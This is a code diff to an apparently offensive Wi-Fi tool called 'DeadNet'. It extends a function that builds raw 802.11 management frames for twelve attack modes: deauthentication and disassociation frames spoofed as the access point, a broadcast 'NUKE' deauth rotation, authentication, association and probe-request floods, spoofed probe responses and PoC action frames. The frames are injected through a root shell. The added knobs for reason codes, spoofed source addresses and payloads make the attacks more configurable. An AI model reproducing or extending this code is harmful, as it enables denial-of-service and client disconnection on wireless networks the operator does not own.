@@ -46,6 +46,12 @@ DEADNET_PREF = "DeadNet"
 BC = "ffffffffffff"
 MIN_FRAME_LEN, MAX_FRAME_LEN = 25, 1600  # mgmt body gate / injector frame[] cap
 DEFAULT_FREQ = 5745
+# A valid locally-administered, non-multicast bogus source — used whenever a
+# spoofed SA / client is needed but the operator left the knob blank, so a
+# frame is never built with an empty/invalid address.
+DEFAULT_FAKE = "020000000001"
+DEFAULT_DEAUTH_REASON = 7   # "class-3 frame from nonassociated STA" (common)
+DEFAULT_DISASSOC_REASON = 8  # "leaving / deauthenticated"
 
 MAC_RE = re.compile(r"^[0-9a-f]{12}$")
 HEX_RE = re.compile(r"^[0-9a-fA-F]*$")
@@ -147,69 +153,94 @@ class MgmtTarget:
 @dataclass
 class MgmtCtx:
     ap_ctx: str = ""
-    assoc_ssid: str = ""
-    fake: str = ""
-    cli: str = ""
-    custom_hex: str = ""
+    assoc_ssid: str = ""      # SSID override for probe/assoc/beacon modes
+    fake: str = ""            # spoofed source address (floods / AP->client)
+    cli: str = ""             # target client MAC (directed deauth/disassoc)
+    custom_hex: str = ""      # raw frame for mode 12
+    reason: int = 0           # deauth/disassoc reason code (0 => per-frame default)
+    payload: str = ""         # optional action-frame payload override (modes 8-10)
 
 
 def eff_ssid(tgt_ssid: str, assoc_ssid: str) -> str:
     return tgt_ssid or assoc_ssid or ""
 
 
+def _reason_body(reason: int, default: int) -> str:
+    """2-byte little-endian reason code body for deauth/disassoc."""
+    r = default if not reason else int(reason)
+    r = 0 if r < 0 else (255 if r > 255 else r)
+    return "%02x00" % r
+
+
+def _fake(ctx: "MgmtCtx") -> str:
+    return norm_mac(ctx.fake) or DEFAULT_FAKE
+
+
+def _cli(ctx: "MgmtCtx") -> str:
+    return norm_mac(ctx.cli) or norm_mac(ctx.fake) or DEFAULT_FAKE
+
+
 def build_frame(mode: int, tgt: MgmtTarget, ctx: MgmtCtx) -> Tuple[str, str]:
-    """Return (label, hexframe) for attack mode 1..12. Byte-identical to the PoC."""
+    """Return (label, hexframe) for attack mode 1..12.
+
+    Frame bytes match the PoC when the knobs are at their defaults; the knobs
+    (reason/cli/fake/ssid/payload/custom_hex on MgmtCtx) only parameterise the
+    documented fields. Addresses are always well-formed: blank spoof/client
+    knobs fall back to DEFAULT_FAKE so a frame is never built malformed.
+    """
     m, t = tgt.mac, tgt.typ
     ap = ctx.ap_ctx or BC
+    deauth = _reason_body(ctx.reason, DEFAULT_DEAUTH_REASON)
+    disassoc = _reason_body(ctx.reason, DEFAULT_DISASSOC_REASON)
     if mode == 1:
         if t == "ap":
             return ("deauth BCAST from AP (SA=%s DA=bcast)" % m,
-                    fr("c000", BC, m, m, "0700"))
+                    fr("c000", BC, m, m, deauth))
         return ("deauth AP->STA (SA=%s DA=%s)" % (ap, m),
-                fr("c000", m, ap, ap, "0700"))
+                fr("c000", m, ap, ap, deauth))
     if mode == 2:
-        cli = ctx.cli or ctx.fake
+        cli = _cli(ctx)
         if t == "ap":
             return ("deauth AP->client %s (SA=%s)" % (cli, m),
-                    fr("c000", cli, m, m, "0700"))
+                    fr("c000", cli, m, m, deauth))
         return ("deauth STA->AP (SA=%s DA=%s)" % (m, ap),
-                fr("c000", ap, m, ap, "0700"))
+                fr("c000", ap, m, ap, deauth))
     if mode == 3:
         if t == "ap":
             return ("disassoc BCAST from AP (SA=%s)" % m,
-                    fr("a000", BC, m, m, "0800"))
+                    fr("a000", BC, m, m, disassoc))
         return ("disassoc AP->STA (SA=%s DA=%s)" % (ap, m),
-                fr("a000", m, ap, ap, "0800"))
+                fr("a000", m, ap, ap, disassoc))
     if mode == 4:
-        cli = ctx.cli or ctx.fake
+        cli = _cli(ctx)
         if t == "ap":
             return ("disassoc AP->client %s (SA=%s)" % (cli, m),
-                    fr("a000", cli, m, m, "0800"))
+                    fr("a000", cli, m, m, disassoc))
         return ("disassoc STA->AP (SA=%s DA=%s)" % (m, ap),
-                fr("a000", ap, m, ap, "0800"))
+                fr("a000", ap, m, ap, disassoc))
     if mode == 5:
         s = eff_ssid(tgt.ssid, ctx.assoc_ssid)
-        sa = ctx.fake if t == "ap" else m
+        sa = _fake(ctx) if t == "ap" else m
         return ('probe-req flood SSID="%s" (SA=%s)' % (s, sa),
                 fr("4000", BC, sa, BC, ssid_ies(s)))
     if mode == 6:
-        sa, da = (ctx.fake, m) if t == "ap" else (m, ap)
+        sa, da = (_fake(ctx), m) if t == "ap" else (m, ap)
         return ("auth flood as %s -> %s" % (sa, da),
                 fr("b000", da, sa, da, "000000010000"))
     if mode == 7:
         s = eff_ssid(tgt.ssid, ctx.assoc_ssid)
-        sa, da = (ctx.fake, m) if t == "ap" else (m, ap)
+        sa, da = (_fake(ctx), m) if t == "ap" else (m, ap)
         return ('assoc-req flood as %s -> %s SSID="%s"' % (sa, da, s),
                 fr("0000", da, sa, da, "04010a00" + ssid_ies(s)))
     if mode == 8:
-        return (("public action cat=04 -> %s" % m),
-                fr("d000", m, m, m, "0409deadbeef4f503132504f43"))
+        body = _action_payload(ctx.payload, "0409deadbeef4f503132504f43")
+        return (("public action cat=04 -> %s" % m), fr("d000", m, m, m, body))
     if mode == 9:
-        return (("vendor action cat=7f OP12POC -> %s" % m),
-                fr("d000", m, m, m, "7fdeadbeef4f503132504f43"))
+        body = _action_payload(ctx.payload, "7fdeadbeef4f503132504f43")
+        return (("vendor action cat=7f OP12POC -> %s" % m), fr("d000", m, m, m, body))
     if mode == 10:
-        return (("non-public action cat=00 -> %s" % m),
-                fr("d000", m, m, m, "0000000000"))
+        body = _action_payload(ctx.payload, "0000000000")
+        return (("non-public action cat=00 -> %s" % m), fr("d000", m, m, m, body))
     if mode == 11:
         s = eff_ssid(tgt.ssid, ctx.assoc_ssid)
         body = "000000000000000064000401" + ssid_ies(s)
@@ -219,16 +250,23 @@ def build_frame(mode: int, tgt: MgmtTarget, ctx: MgmtCtx) -> Tuple[str, str]:
         return (("probe-resp spoof -> bcast BSSID=%s" % ap),
                 fr("5000", BC, m, ap, body))
     if mode == 12:
-        return ("custom frame", ctx.custom_hex)
+        return ("custom frame", re.sub(r"[\s:]", "", ctx.custom_hex or "").lower())
     return ("deauth BCAST from AP (SA=%s DA=bcast)" % m,
-            fr("c000", BC, m, m, "0700"))
+            fr("c000", BC, m, m, deauth))
 
 
-def bld_nuke(mac: str, tog: int) -> str:
-    """Wildcard deauth/disassoc from a spoofed BSSID (NUKE rotation)."""
+def _action_payload(payload: str, default: str) -> str:
+    """Sanitised action-frame body override, else the default payload."""
+    p = re.sub(r"[\s:]", "", payload or "").lower()
+    return p if (p and HEX_RE.match(p) and len(p) % 2 == 0) else default
+
+
+def bld_nuke(mac: str, tog: int, reason: int = 0) -> str:
+    """Broadcast deauth/disassoc spoofed AS the AP (SA=BSSID, DA=broadcast) so
+    every client honours it (NUKE rotation flips the two per frame)."""
     if tog == 0:
-        return fr("c000", BC, mac, mac, "0700")
-    return fr("a000", BC, mac, mac, "0800")
+        return fr("c000", BC, mac, mac, _reason_body(reason, DEFAULT_DEAUTH_REASON))
+    return fr("a000", BC, mac, mac, _reason_body(reason, DEFAULT_DISASSOC_REASON))
 
 
 # --------------------------------------------------------------------------
@@ -314,6 +352,18 @@ class DaemonInjector:
                 raise RuntimeError("daemon EOF")
             return parse_daemon_reply(line)
 
+    def interrupt(self):
+        """Hard-kill the child WITHOUT taking the send lock, so a send() blocked
+        in select()/readline() unblocks at once (it then raises and the caller
+        falls back / stops). Safe to call from another thread; the daemon
+        re-spawns lazily on the next send."""
+        p = self.proc
+        if p is not None:
+            try:
+                p.kill()
+            except Exception:  # noqa: BLE001
+                pass
+
     def close(self):
         with self.lock:
             self._stop()
@@ -380,6 +430,15 @@ class MgmtTxController:
         cmd = "%s %s %s %s %s" % (path, "--fast " if fast else "", iface, freq, hexframe)
         _, out = rootshell.su_rc(cmd.strip(), timeout=15)
         return parse_oneshot_output(out)
+
+    def interrupt(self):
+        """Unblock any in-flight send() at once (STOP responsiveness). Does not
+        tear the daemons down — they re-spawn lazily on the next send."""
+        for d in list(self.daemons.values()):
+            try:
+                d.interrupt()
+            except Exception:  # noqa: BLE001
+                pass
 
     def close(self):
         for d in list(self.daemons.values()):
